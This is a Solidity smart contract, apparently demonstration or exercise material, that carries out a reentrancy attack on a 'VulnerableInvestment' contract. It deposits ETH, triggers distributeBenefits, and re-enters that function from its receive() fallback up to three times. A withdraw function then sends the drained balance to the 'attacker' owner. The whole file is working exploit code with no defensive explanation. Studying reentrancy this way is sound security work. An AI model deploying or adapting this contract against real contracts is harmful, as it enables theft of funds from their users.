// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

// Interface for the vulnerable contract
interface IVulnerableInvestment {
    function doInvest() external payable;
    function distributeBenefits(uint256 percentage) external;
}

/**
 * @title Simple Reentrancy Attack
 * @notice This contract demonstrates a simple reentrancy attack on the VulnerableInvestment contract
 */
contract SimpleReentrancyAttack {
    IVulnerableInvestment public target;
    uint256 public attackCount;
    address public owner;
    
    constructor(address _target) {
        target = IVulnerableInvestment(_target);
        owner = msg.sender;
    }
    
    // Start the attack
    function attack() external payable {
        // Invest some ETH first. Make sure that the total_invested is above MIN_INVESTED
        target.doInvest{value: msg.value}();
        
        // Reset counter and start the attack
        attackCount = 0;
        target.distributeBenefits(5); // 5% distribution
    }
    
    // This is where the reentrancy happens
    receive() external payable {
        attackCount++;
        
        // Only reenter a few times to avoid gas issues
        if (attackCount < 3) {
            target.distributeBenefits(5);
        }
    }
    
    // Withdraw funds after the attack
    function withdraw() external {
        require(msg.sender == owner, "Only the attacker can withdraw >:)");
        payable(msg.sender).transfer(address(this).balance);
    }
}